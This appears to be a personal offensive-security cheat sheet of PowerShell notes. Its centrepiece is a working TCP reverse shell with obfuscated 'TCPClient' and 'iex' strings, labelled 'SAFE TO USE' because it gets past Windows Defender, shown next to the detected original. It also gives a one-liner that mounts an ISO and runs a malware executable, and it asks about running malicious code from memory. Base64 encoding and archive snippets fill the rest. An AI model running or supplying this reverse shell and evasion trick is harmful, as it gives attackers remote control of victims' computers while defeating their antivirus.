# Remove Powershell Execution
#### Notes: 
 There are a few ways in PowerShell to call for execution 
  - Invoke-Expression
  - IEX 
  - Invoke-Command 
  - ICM 
  - .invoke() 
  - setting an alias 
  - etc.

#### Example:
```powershell
replace 'IEX' with 'Write-Host'
```
#### References: 
- https://twitter.com/pmelson/status/1263510602305146882


# Powershell Reverse Shell:
### SAFE TO USE:
```
$client = New-Object System.Net.Sockets.T'CPC'lient('192.168.1.8',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (i'e'x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
made changes to "TCPClient" and "iex" that was all that was needed to get it past defender. 
### CAUGHT BY DEFENDER:
```
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.8',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

# Powershell Mount ISO and run malware
```
$path=$PWD.path
Mount-DiskImage $path\Filename.ISO
start $path\Filename\Malware.exe
```

```
$path=$PWD.path;Mount-DiskImage $path\Filename.ISO;start $path\Filename\Malware.exe
```

# Base64 encoding cheat sheet
Here’s a quick Cheat Sheet of Base64 Encoding I’ve put together –

|Base64 Code|Decoded|Description|
|-----------|-------|-----------|
|JAB|$.|Variable Declaration (UTF-16)|
|TVq|MZ|MZ Header|
|SUVY|IEX|PowerShell Invoke Expression|
|SQBFAF|I.E.|PowerShell Invoke Expression (UTF-16)|
|SQBuAH|I.n.|PowerShell Invoke string (UTF-16) e.g. Invoke-MimiKatz|
|PAA|<.|Often used by Emotet [Malicious Document pulling down Emotet binary) (UTF-16)|
|aWV4|iex|PowerShell Invoke Expression|
|aQBlA|i.e.|PowerShell Invoke Expression (UTF-16)|
|dmFy|var|Variable Declaration|
|dgBhA|v.a.|Variable Declaration (UTF-16)|
|H4sIA| |gzip magic bytes (0x1f8b)|

The string  JABz[..truncated..]IAagBwA= cin its most basic form is an onion. It has several layers to cleverly hide what it’s supposed to do in order to evade detection. But unlike an onion, it only has 3 Layers before we get to our Golden Egg. Let’s take a walk through each layer.

Reference: https://community.sophos.com/sophos-labs/b/blog/posts/decoding-malicious-powershell


# Encoding string in Base64
```powershell
$MYTEXT = 'This is my secret text'
$ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($MYTEXT))
Write-Output $ENCODED
```
#### Output: 
```
VABoAGkAcwAgAGkAcwAgAG0AeQAgAHMAZQBjAHIAZQB0ACAAdABlAHgAdAA=
```
# Decoding string in Base64
```powershell
$MYTEXT = 'VABoAGkAcwAgAGkAcwAgAG0AeQAgAHMAZQBjAHIAZQB0ACAAdABlAHgAdAA='
$DECODED = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($MYTEXT))
Write-Output $DECODED
```
#### Output: 
```
This is my secret text
```
#### References: 
- https://techexpert.tips/powershell/powershell-base64-encoding/

Base64 Encode/Decode file
```powershell
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($base64string))
```
#### References:
- https://stackoverflow.com/questions/42592518/encode-decode-exe-into-base64

# Base64 Encode zip file
```powershell
echo "testing testing 123" > test.txt
Compress-Archive -Path .\* -DestinationPath ..\Powershell.zip
mv ..\Powershell.zip .\
$FileName = 'Powershell.zip'
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
echo $base64string
$base64string | Out-File '.\test64.txt'
```
#### Output:
```
UEsDBBQAAAAIAIMBZVWbYo0JIAAAACwAAAAIAAAAdGVzdC50eHT7/6+EIZWhmKGEIZMhjyGdQYEBnW/IYMRgzMDLwMUAAFBLAQIUABQAAAAIAIMBZVWbYo0JIAAAACwAAAAIAAAAAAAAAAAAAAAAAAAAAAB0ZXN0LnR4dFBLBQYAAAAAAQABADYAAABGAAAAAAA=
```
# Base64 Decode to zip file
```powershell
$FileName3 = 'Powershell3.zip'
[IO.File]::WriteAllBytes($FileName3, [Convert]::FromBase64String('UEsDBBQAAAAIAIMBZVWbYo0JIAAAACwAAAAIAAAAdGVzdC50eHT7/6+EIZWhmKGEIZMhjyGdQYEBnW/IYMRgzMDLwMUAAFBLAQIUABQAAAAIAIMBZVWbYo0JIAAAACwAAAAIAAAAAAAAAAAAAAAAAAAAAAB0ZXN0LnR4dFBLBQYAAAAAAQABADYAAABGAAAAAAA='))
```
#### Questions:
- could I chain this with malicious python code, which can be run from inside the zip file?
- could I remove or run the contents from powershell? 
- could I load contents directly into ram? 
- can I added encryption in here as well? 


# Compress files to create an archive file
```powershell
$compress = @{
  Path = "C:\Reference\Draftdoc.docx", "C:\Reference\Images\*.vsd"
  CompressionLevel = "Fastest"
  DestinationPath = "C:\Archives\Draft.Zip"
}
Compress-Archive @compress
```
# Compress a directory that includes the root directory
```powershell
Compress-Archive -Path C:\Reference -DestinationPath C:\Archives\Draft.zip
```
# Compress a directory that excludes the root directory
```powershell
Compress-Archive -Path C:\Reference\* -DestinationPath C:\Archives\Draft.zip
```
# Update an existing archive file
```powershell
Compress-Archive -Path C:\Reference -Update -DestinationPath C:\Archives\Draft.Zip
```
#### References: 
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.archive/compress-archive?view=powershell-7.2

# Decompress (Expand) files from an archive file
#### Extract the contents of an archive
```powershell
Expand-Archive -LiteralPath 'C:\Archives\Draft[v1].Zip' -DestinationPath C:\Reference
```
#### Extract the contents of an archive in the current folder
```powershell
Expand-Archive -Path Draftv2.Zip -DestinationPath C:\Reference
```

#### References: 
- https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.archive/expand-archive?view=powershell-7.2
- https://blog.appdelivery.dk/2018/10/13/transferring-files-with-base64/
